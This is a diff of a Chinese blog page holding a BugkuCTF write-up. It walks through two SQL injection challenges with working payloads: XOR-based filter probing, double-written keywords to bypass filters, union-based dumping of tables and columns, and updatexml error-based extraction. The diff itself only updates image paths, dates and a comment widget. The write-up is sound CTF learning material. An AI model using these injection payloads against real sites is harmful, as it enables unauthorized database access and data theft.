@@ -106,22 +106,22 @@
 <meta property="og:site_name" content="Ebounce的小博客（´v｀）">
 <meta property="og:description" content="第一次sql注入 最近一直在做BugCTF web的题，今天遇到了十分涨姿势的一道SQL注入，就是多次了。  这道题一进去看到一个?id=1就猜测多半存在sql注入了，但是在id后面输入&apos;，页面报错，大致可以确定存在sql注入了，然后按照一般sql注入的步骤去操作， 测试了两组payload，都是报错界面（后面的一个-其实都是两个-号） id=1&apos;+or+1=1--+ id=1&apos;+order+by">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://www.ebounce.cn/article/undefined/1.png">
-<meta property="og:image" content="https://www.ebounce.cn/article/undefined/2.png">
-<meta property="og:image" content="https://www.ebounce.cn/article/undefined/3.png">
-<meta property="og:image" content="https://www.ebounce.cn/article/undefined/4.png">
-<meta property="og:image" content="https://www.ebounce.cn/article/undefined/5.png">
-<meta property="og:image" content="https://www.ebounce.cn/article/undefined/6.png">
-<meta property="og:image" content="https://www.ebounce.cn/article/undefined/7.png">
-<meta property="og:image" content="https://www.ebounce.cn/article/undefined/8.png">
-<meta property="og:image" content="https://www.ebounce.cn/article/undefined/9.png">
-<meta property="og:image" content="https://www.ebounce.cn/article/undefined/11.png">
-<meta property="og:image" content="https://www.ebounce.cn/article/undefined/10.png">
-<meta property="og:updated_time" content="2019-02-22T10:36:32.218Z">
+<meta property="og:image" content="https://www.ebounce.cn/article/4aa5b10c/1.png">
+<meta property="og:image" content="https://www.ebounce.cn/article/4aa5b10c/2.png">
+<meta property="og:image" content="https://www.ebounce.cn/article/4aa5b10c/3.png">
+<meta property="og:image" content="https://www.ebounce.cn/article/4aa5b10c/4.png">
+<meta property="og:image" content="https://www.ebounce.cn/article/4aa5b10c/5.png">
+<meta property="og:image" content="https://www.ebounce.cn/article/4aa5b10c/6.png">
+<meta property="og:image" content="https://www.ebounce.cn/article/4aa5b10c/7.png">
+<meta property="og:image" content="https://www.ebounce.cn/article/4aa5b10c/8.png">
+<meta property="og:image" content="https://www.ebounce.cn/article/4aa5b10c/9.png">
+<meta property="og:image" content="https://www.ebounce.cn/article/4aa5b10c/11.png">
+<meta property="og:image" content="https://www.ebounce.cn/article/4aa5b10c/10.png">
+<meta property="og:updated_time" content="2019-07-19T09:23:59.611Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BugkuCTF 多次wp">
 <meta name="twitter:description" content="第一次sql注入 最近一直在做BugCTF web的题，今天遇到了十分涨姿势的一道SQL注入，就是多次了。  这道题一进去看到一个?id=1就猜测多半存在sql注入了，但是在id后面输入&apos;，页面报错，大致可以确定存在sql注入了，然后按照一般sql注入的步骤去操作， 测试了两组payload，都是报错界面（后面的一个-其实都是两个-号） id=1&apos;+or+1=1--+ id=1&apos;+order+by">
-<meta name="twitter:image" content="https://www.ebounce.cn/article/undefined/1.png">
+<meta name="twitter:image" content="https://www.ebounce.cn/article/4aa5b10c/1.png">
 
 
 
@@ -364,7 +364,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-02-22 18:36:32" itemprop="dateModified" datetime="2019-02-22T18:36:32+08:00">2019-02-22</time>
+                <time title="修改时间：2019-07-19 17:23:59" itemprop="dateModified" datetime="2019-07-19T17:23:59+08:00">2019-07-19</time>
               </span>
             
           
@@ -446,14 +446,14 @@
       
         <h1>第一次sql注入</h1>
 最近一直在做BugCTF web的题，今天遇到了十分涨姿势的一道SQL注入，就是多次了。
-<img src="/article/undefined/1.png">
+<img src="/article/4aa5b10c/1.png">
 这道题一进去看到一个?id=1就猜测多半存在sql注入了，但是在id后面输入'，页面报错，大致可以确定存在sql注入了，然后按照一般sql注入的步骤去操作，
 测试了两组payload，都是报错界面（后面的一个-其实都是两个-号）
 <pre><code>id=1'+or+1=1--+</code></pre>
 <pre><code>id=1'+order+by+2--+</code></pre>
 于是判断该题可能过滤了一些关键词，下面使用新姿势来测试究竟过滤了哪些关键词--异或法
 （sql中的异或符号为^，在该符号两侧的表达式均为真或均为假时，会返回假，其余情况返回真，于是使用该方法来判断过滤的关键词）
-<img src="/article/undefined/2.png">
+<img src="/article/4aa5b10c/2.png">
 <pre><code>id=1'^(length("or")!=0)--+</code></pre>
 返回了正常界面，由于已经验证过表达式id=1为真，根据异或的真值规则可以判断出只有后面的式子为假，而后面表达式的意思为判断or字符的长度为几,length()
 会返回字符长度，由于sql里面0=False，所以后面这句表达式在于判断or字符是否为0，也就是是不是被过滤了掉了，由返回结果可以判断出or字符确实是被过滤掉了，
@@ -461,22 +461,22 @@
 就开始注入了，可以透过双写的方式绕过关键词过滤，
 查字段数：(这里只是or被过滤掉了，只需要双写or即可)
 <pre><code>id=1'+oorrder+by+2--+</code></pre>
-<img src="/article/undefined/3.png">
+<img src="/article/4aa5b10c/3.png">
 字段数为2，然后构造union查询注入，当然我们需要确定回显字段，
-<img src="/article/undefined/4.png">
+<img src="/article/4aa5b10c/4.png">
 <pre><code>id=x'+ununionion+seselectlect+1,2--+</code></pre>
 随后爆表名：
 <pre><code>id=x'+ununionion+seselectlect+1,group_concat(table_name)+from+infoorrmation_schema.tables+where+table_schema=database()--+</code></pre>
-<img src="/article/undefined/5.png">
+<img src="/article/4aa5b10c/5.png">
 爆列名：
-<img src="/article/undefined/6.png">
+<img src="/article/4aa5b10c/6.png">
 <pre><code>id=x'+ununionion+seselectlect+1,group_concat(column_name)+from+infoorrmation_schema.columns+where+table_name='flag1'--+</code></pre>
 爆值：
 flag1为：
 <pre><code>id=x'+ununionion+seselectlect+1,group_concat(flag1)+from+flag1--+</code></pre>
-<img src="/article/undefined/7.png">
+<img src="/article/4aa5b10c/7.png">
 然而flag并不是这个，转头去爆address的值
-<img src="/article/undefined/8.png">
+<img src="/article/4aa5b10c/8.png">
 <pre><code>id=x'+ununionion+seselectlect+1,group_concat(address)+from+flag1--+</code></pre>
 <h1>第二次sql注入</h1>
 点击进入了下一关又是一个sql注入，一样的id参数，而这次居然有sql的错误回显，但测试了一下union select注入似乎不可以
@@ -484,14 +484,14 @@ flag1为：
 似乎能和回显注入一样，能够执行，因此下面payload如下
 爆表名：
 <pre><code>id=1'and+updatexml(1,concat('*-',(select+group_concat(table_name)+from+information_schema.tables+where+table_schema=database()),'*-'),3)--+</code></pre>
-<img src="/article/undefined/9.png">
+<img src="/article/4aa5b10c/9.png">
 接着爆列名:
-<img src="/article/undefined/11.png">
+<img src="/article/4aa5b10c/11.png">
 <pre><code>id=1'and+updatexml(1,concat('*-',(select+group_concat(column_name)+from+information_schema.columns+where+table_name='flag2'),'*-'),3)--+</code></pre>
 最后爆值找到flag：
 <pre><code>id=1'and+updatexml(1,concat('*-',(select+flag2+from+flag2),'-*'),3)--+</code></pre>
 updatexml()感觉在这道题的报错注入里面更像式标识符
-<img src="/article/undefined/10.png">
+<img src="/article/4aa5b10c/10.png">
 到此为止本题结束。
       
     </div>
@@ -954,6 +954,35 @@ updatexml()感觉在这道题的报错注入里面更像式标识符
 
 
   
+
+
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+
+
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '',
+    clientSecret: '',
+    repo: '',
+    owner: '',
+    admin: [''],
+    id: md5(location.pathname),
+    
+      language: 'zh-CN',
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
 
 
   
